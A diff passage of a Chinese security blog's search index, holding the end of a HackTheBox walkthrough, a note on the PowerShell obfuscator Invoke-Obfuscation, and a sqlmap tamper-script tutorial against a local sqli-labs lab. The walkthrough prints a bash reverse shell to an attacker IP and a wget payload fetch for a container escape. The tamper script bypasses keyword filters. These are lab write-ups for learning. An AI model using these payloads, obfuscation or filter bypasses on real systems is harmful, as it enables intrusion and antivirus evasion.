+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.16.11/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/maingo.png" alt="maingo"></p>
+<p>3.在二进制文件所在目录用python起一个web服务</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_webserver.png" alt="webserver"></p>
+<p>4.在docker容器中执行命令从本机获取二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.16.11:8000/main</span><br></pre></td></tr></table></figure>
+
+<p>5.赋予二进制文件最高权限，并执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x main &amp;&amp; ./main</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh1main.png" alt="ssh1main"></p>
+<p>6.监听9999端口（端口根据payload里面的来）</p>
+<p>7.在SSH1中二进制文件运行并覆盖完成<code>/bin/sh</code>，SSH2执行如下命令即可收到反弹回来的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp-dev01 /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh2.png" alt="ssh2"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_rootshell.png" alt="rootshell"></p>
+<p>root.txt在<code>/root</code>目录下</p>
+<p>如果流程看不懂，还有终极图解方便理解（文字表达能力较差，各位师傅多担待）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E5%85%A8%E5%B1%80.png" alt="全局"></p>
+<p>可能出现问题的点估计就是提权了，我也好久弹不出Shell…</p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Invoke-Obfuscation工具小记</title>
+    <url>/2022/02/22/Invoke-Obfuscation%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="Powershell命令和脚本混淆器Invoke-Obfuscation"><a href="#Powershell命令和脚本混淆器Invoke-Obfuscation" class="headerlink" title="Powershell命令和脚本混淆器Invoke-Obfuscation"></a>Powershell命令和脚本混淆器Invoke-Obfuscation</h1><p>下载地址：<a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
+<span id="more"></span>
+
+<h2 id="安装报错解决"><a href="#安装报错解决" class="headerlink" title="安装报错解决"></a>安装报错解决</h2><p>在安装该框架的时候碰到了点问题，基本上报的错误是下面这个</p>
+<blockquote>
+<p>Import-Module.\Invoke-Obfuscation.psd1 : 无法将“Import-Module.\Invoke-Obfuscation.psd1”项识别为 cmdlet、函数、脚本文 件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确，然后再试一次</p>
+</blockquote>
+<p><strong>解决方法</strong></p>
+<p>直接用管理员身份运行Powershell (实测从管理员身份的cmd转powshell没用)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br><span class="line">Import-Module ./Invoke-Obfuscation.psd1</span><br><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>
+
+<p>问题解决</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20211109154703264.png" alt="image-20211109154703264"></p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><blockquote>
+<p>1、设置要混淆的ps1文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set scriptpath 路径     //直接加ps1文件路径 例如：E:\...\payload.ps1</span><br><span class="line">或</span><br><span class="line">set scriptblock &quot;xxx&quot;     //xxx为powershell命令</span><br></pre></td></tr></table></figure>
+
+<p>2、加密</p>
+<p>encoding选择加密方式</p>
+<p>3、输出文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out [路径\文件名]   //例如：E:\\...\1.ps1</span><br></pre></td></tr></table></figure>
+
+<p>*4、选择命令的启动方式</p>
+<p>加密后back返回上级</p>
+<p>launcher选择命令的启动方式</p>
+</blockquote>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、<a href="https://www.cnblogs.com/mrhonest/p/13425804.html">https://www.cnblogs.com/mrhonest/p/13425804.html</a></p>
+<p>2、<a href="https://zhuanlan.zhihu.com/p/377121742%EF%BC%88%E5%A5%BD%E6%96%87%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%89">https://zhuanlan.zhihu.com/p/377121742（好文！！！）</a></p>
+]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python库劫持</title>
     <url>/2022/01/14/Python%E5%BA%93%E5%8A%AB%E6%8C%81/</url>
     <content><![CDATA[<h1 id="Python库劫持"><a href="#Python库劫持" class="headerlink" title="Python库劫持"></a>Python库劫持</h1><p>之前在做VulnHub的时候需要利用<strong>Python库劫持</strong>具体学习一下</p>
@@ -942,54 +942,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Sqlmap-tamper</title>
-    <url>/2022/02/23/Sqlmap-tamper/</url>
-    <content><![CDATA[<h1 id="Sqlmap-tamper"><a href="#Sqlmap-tamper" class="headerlink" title="Sqlmap-tamper"></a>Sqlmap-tamper</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sqlmap的<code>--tamper</code>参数可以用给定脚本修改注入数据，主要功能是用来绕过各种waf</p>
-<span id="more"></span>
-
-<h2 id="Tamper结构"><a href="#Tamper结构" class="headerlink" title="Tamper结构"></a>Tamper结构</h2><p>从sqlmap自带的tamper中随便找了一个</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces each keyword character with lower case value (e.g. SELECT -&gt; select)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * Microsoft SQL Server 2005</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string">        * Oracle 10g</span></span><br><span class="line"><span class="string">        * PostgreSQL 8.3, 8.4, 9.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass very weak and bespoke web application firewalls</span></span><br><span class="line"><span class="string">          that has poorly written permissive regular expressions</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;insert&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="keyword">for</span> match <span class="keyword">in</span> re.finditer(<span class="string">r&quot;\b[A-Za-z_]+\b&quot;</span>, retVal):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> word.upper() <span class="keyword">in</span> kb.keywords:</span><br><span class="line">                retVal = retVal.replace(word, word.lower())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="引入库"><a href="#引入库" class="headerlink" title="引入库"></a>引入库</h3><p>最开始导入必须的库</p>
-<h3 id="PRIORITY"><a href="#PRIORITY" class="headerlink" title="PRIORITY"></a>PRIORITY</h3><p>用来定义脚本的优先级，参数如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LOWEST = -<span class="number">100</span></span><br><span class="line">LOWER = -<span class="number">50</span></span><br><span class="line">LOW = -<span class="number">10</span></span><br><span class="line">NORMAL = <span class="number">0</span></span><br><span class="line">HIGH = <span class="number">10</span></span><br><span class="line">HIGHER = <span class="number">50</span></span><br><span class="line">HIGHEST = <span class="number">100</span></span><br></pre></td></tr></table></figure>
-
-<p>当同时使用多个tamper时，按优先级从高到低使用，编写的时候还得看运用场景，就跑一个tamper感觉这个参数也没啥必要</p>
-<h3 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h3><p>一般用来输出提示信息，比如tamper支持的使用环境或场景，也可以不写东西直接pass</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">singleTimeWarnMessage() #在控制台中输出警告信息</span><br></pre></td></tr></table></figure>
-
-<h3 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h3><p>tamper脚本主要函数，用于实现tamper的功能</p>
-<p><code>payload</code>参数为sqlmap生成的原始payload</p>
-<p><code>**kwargs</code>参数用的比较少，下面两个tamper中<code>kwargs</code>参数都通过更改请求头来绕waf</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#varnish.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-originating-IP&quot;</span>] = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#xforwardedfor.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27; (and alike)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Client-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Real-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;CF-Connecting-IP&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;True-Client-IP&quot;</span>] = randomIP()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Reference: https://developer.chrome.com/multidevice/data-compression-for-isps#proxy-connection</span></span><br><span class="line">    headers[<span class="string">&quot;Via&quot;</span>] = <span class="string">&quot;1.1 Chrome-Compression-Proxy&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Reference: https://wordpress.org/support/topic/blocked-country-gaining-access-via-cloudflare/#post-9812007</span></span><br><span class="line">    headers[<span class="string">&quot;CF-IPCountry&quot;</span>] = random.sample((<span class="string">&#x27;GB&#x27;</span>, <span class="string">&#x27;US&#x27;</span>, <span class="string">&#x27;FR&#x27;</span>, <span class="string">&#x27;AU&#x27;</span>, <span class="string">&#x27;CA&#x27;</span>, <span class="string">&#x27;NZ&#x27;</span>, <span class="string">&#x27;BE&#x27;</span>, <span class="string">&#x27;DK&#x27;</span>, <span class="string">&#x27;FI&#x27;</span>, <span class="string">&#x27;IE&#x27;</span>, <span class="string">&#x27;AT&#x27;</span>, <span class="string">&#x27;IT&#x27;</span>, <span class="string">&#x27;LU&#x27;</span>, <span class="string">&#x27;NL&#x27;</span>, <span class="string">&#x27;NO&#x27;</span>, <span class="string">&#x27;PT&#x27;</span>, <span class="string">&#x27;SE&#x27;</span>, <span class="string">&#x27;ES&#x27;</span>, <span class="string">&#x27;CH&#x27;</span>), <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
-
-<h2 id="Tamper编写"><a href="#Tamper编写" class="headerlink" title="Tamper编写"></a>Tamper编写</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a><strong>环境</strong></h3><p>phpstudy + sqli-labs</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223191305566.png" alt="image-20220223191305566"></p>
-<p>过滤了<code>or</code>和<code>and</code></p>
-<p>查看源文件，这两个关键词被替换为空了</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223191416824.png" alt="image-20220223191416824"></p>
-<p>并且在执行sql查询之前，用户输入的内容只用<code>blacklist</code>函数过滤了一遍，那么这里就可以直接用双写来绕过</p>
-<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;bypass:or,and&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    双写绕过关键词on和and过滤</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = re.sub(<span class="string">r&quot;(OR)&quot;</span>,<span class="string">&quot;OORR&quot;</span>,retVal)</span><br><span class="line">    retVal = re.sub(<span class="string">r&quot;(AND)&quot;</span>, <span class="string">&quot;AANDND&quot;</span>, retVal)</span><br><span class="line">    <span class="comment"># retVal = re.sub(r&quot;(AND)&quot;, &quot;%26%26&quot;, retVal) AND可用&amp;&amp;替换</span></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p>执行测试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-25/?id=1 --tamper=test --proxy=http://127.0.0.1:80 -v 3 --dbs</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195544409.png" alt="image-20220223195544409"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195602740.png" alt="image-20220223195602740"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195732933.png" alt="image-20220223195732933"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195826674.png" alt="image-20220223195826674"></p>
-<p>可以看到原始payload中的关键词被替换掉了，最终也成功获取了数据库</p>
-<p>END</p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>sqlmap作为一款强大的sql注入工具效率远远高于纯手工注入，再根据实际渗透的场景来编写tamper，两者结合使用可以节约很多时间</p>
-]]></content>
-      <tags>
-        <tag>sqlmap</tag>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>VulnHub-DarkHole2</title>
     <url>/2022/01/20/VulnHub-DarkHole2/</url>
     <content><![CDATA[<h1 id="VulnHub-DarkHole2"><a href="#VulnHub-DarkHole2" class="headerlink" title="VulnHub-DarkHole2"></a>VulnHub-DarkHole2</h1><p><strong>Level: Medium-Hard</strong></p>
@@ -1011,7 +963,7 @@
 <p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120202700671.png" alt="image-20220120202700671"></p>
 <p>用git命令发现了邮箱以及密码</p>
 <blockquote>
-<p>Email：<a href="mailto:&#108;&#x75;&#115;&#x68;&#64;&#x61;&#100;&#x6d;&#x69;&#110;&#46;&#x63;&#x6f;&#109;">&#108;&#x75;&#115;&#x68;&#64;&#x61;&#100;&#x6d;&#x69;&#110;&#46;&#x63;&#x6f;&#109;</a></p>
+<p>Email：<a href="mailto:&#108;&#x75;&#x73;&#104;&#64;&#x61;&#x64;&#109;&#x69;&#x6e;&#46;&#x63;&#111;&#x6d;">&#108;&#x75;&#x73;&#104;&#64;&#x61;&#x64;&#109;&#x69;&#x6e;&#46;&#x63;&#111;&#x6d;</a></p>
 <p>Password：321</p>
 </blockquote>
 <p>通过备份下来的文件可知存在登陆界面，利用获得的邮箱密码登录</p>
@@ -1073,6 +1025,54 @@
       <tags>
         <tag>渗透测试</tag>
         <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sqlmap-tamper</title>
+    <url>/2022/02/23/Sqlmap-tamper/</url>
+    <content><![CDATA[<h1 id="Sqlmap-tamper"><a href="#Sqlmap-tamper" class="headerlink" title="Sqlmap-tamper"></a>Sqlmap-tamper</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sqlmap的<code>--tamper</code>参数可以用给定脚本修改注入数据，主要功能是用来绕过各种waf</p>
+<span id="more"></span>
+
+<h2 id="Tamper结构"><a href="#Tamper结构" class="headerlink" title="Tamper结构"></a>Tamper结构</h2><p>从sqlmap自带的tamper中随便找了一个</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces each keyword character with lower case value (e.g. SELECT -&gt; select)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * Microsoft SQL Server 2005</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string">        * Oracle 10g</span></span><br><span class="line"><span class="string">        * PostgreSQL 8.3, 8.4, 9.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass very weak and bespoke web application firewalls</span></span><br><span class="line"><span class="string">          that has poorly written permissive regular expressions</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;insert&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="keyword">for</span> match <span class="keyword">in</span> re.finditer(<span class="string">r&quot;\b[A-Za-z_]+\b&quot;</span>, retVal):</span><br><span class="line">            word = match.group()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> word.upper() <span class="keyword">in</span> kb.keywords:</span><br><span class="line">                retVal = retVal.replace(word, word.lower())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="引入库"><a href="#引入库" class="headerlink" title="引入库"></a>引入库</h3><p>最开始导入必须的库</p>
+<h3 id="PRIORITY"><a href="#PRIORITY" class="headerlink" title="PRIORITY"></a>PRIORITY</h3><p>用来定义脚本的优先级，参数如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LOWEST = -<span class="number">100</span></span><br><span class="line">LOWER = -<span class="number">50</span></span><br><span class="line">LOW = -<span class="number">10</span></span><br><span class="line">NORMAL = <span class="number">0</span></span><br><span class="line">HIGH = <span class="number">10</span></span><br><span class="line">HIGHER = <span class="number">50</span></span><br><span class="line">HIGHEST = <span class="number">100</span></span><br></pre></td></tr></table></figure>
+
+<p>当同时使用多个tamper时，按优先级从高到低使用，编写的时候还得看运用场景，就跑一个tamper感觉这个参数也没啥必要</p>
+<h3 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h3><p>一般用来输出提示信息，比如tamper支持的使用环境或场景，也可以不写东西直接pass</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">singleTimeWarnMessage() #在控制台中输出警告信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h3><p>tamper脚本主要函数，用于实现tamper的功能</p>
+<p><code>payload</code>参数为sqlmap生成的原始payload</p>
+<p><code>**kwargs</code>参数用的比较少，下面两个tamper中<code>kwargs</code>参数都通过更改请求头来绕waf</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#varnish.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-originating-IP&quot;</span>] = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#xforwardedfor.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27; (and alike)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Client-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Real-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;CF-Connecting-IP&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;True-Client-IP&quot;</span>] = randomIP()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Reference: https://developer.chrome.com/multidevice/data-compression-for-isps#proxy-connection</span></span><br><span class="line">    headers[<span class="string">&quot;Via&quot;</span>] = <span class="string">&quot;1.1 Chrome-Compression-Proxy&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Reference: https://wordpress.org/support/topic/blocked-country-gaining-access-via-cloudflare/#post-9812007</span></span><br><span class="line">    headers[<span class="string">&quot;CF-IPCountry&quot;</span>] = random.sample((<span class="string">&#x27;GB&#x27;</span>, <span class="string">&#x27;US&#x27;</span>, <span class="string">&#x27;FR&#x27;</span>, <span class="string">&#x27;AU&#x27;</span>, <span class="string">&#x27;CA&#x27;</span>, <span class="string">&#x27;NZ&#x27;</span>, <span class="string">&#x27;BE&#x27;</span>, <span class="string">&#x27;DK&#x27;</span>, <span class="string">&#x27;FI&#x27;</span>, <span class="string">&#x27;IE&#x27;</span>, <span class="string">&#x27;AT&#x27;</span>, <span class="string">&#x27;IT&#x27;</span>, <span class="string">&#x27;LU&#x27;</span>, <span class="string">&#x27;NL&#x27;</span>, <span class="string">&#x27;NO&#x27;</span>, <span class="string">&#x27;PT&#x27;</span>, <span class="string">&#x27;SE&#x27;</span>, <span class="string">&#x27;ES&#x27;</span>, <span class="string">&#x27;CH&#x27;</span>), <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<h2 id="Tamper编写"><a href="#Tamper编写" class="headerlink" title="Tamper编写"></a>Tamper编写</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a><strong>环境</strong></h3><p>phpstudy + sqli-labs</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223191305566.png" alt="image-20220223191305566"></p>
+<p>过滤了<code>or</code>和<code>and</code></p>
+<p>查看源文件，这两个关键词被替换为空了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223191416824.png" alt="image-20220223191416824"></p>
+<p>并且在执行sql查询之前，用户输入的内容只用<code>blacklist</code>函数过滤了一遍，那么这里就可以直接用双写来绕过</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;bypass:or,and&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    双写绕过关键词on和and过滤</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = re.sub(<span class="string">r&quot;(OR)&quot;</span>,<span class="string">&quot;OORR&quot;</span>,retVal)</span><br><span class="line">    retVal = re.sub(<span class="string">r&quot;(AND)&quot;</span>, <span class="string">&quot;AANDND&quot;</span>, retVal)</span><br><span class="line">    <span class="comment"># retVal = re.sub(r&quot;(AND)&quot;, &quot;%26%26&quot;, retVal) AND可用&amp;&amp;替换</span></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p>执行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-25/?id=1 --tamper=test --proxy=http://127.0.0.1:80 -v 3 --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195544409.png" alt="image-20220223195544409"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195602740.png" alt="image-20220223195602740"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195732933.png" alt="image-20220223195732933"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220223195826674.png" alt="image-20220223195826674"></p>
+<p>可以看到原始payload中的关键词被替换掉了，最终也成功获取了数据库</p>
+<p>END</p>
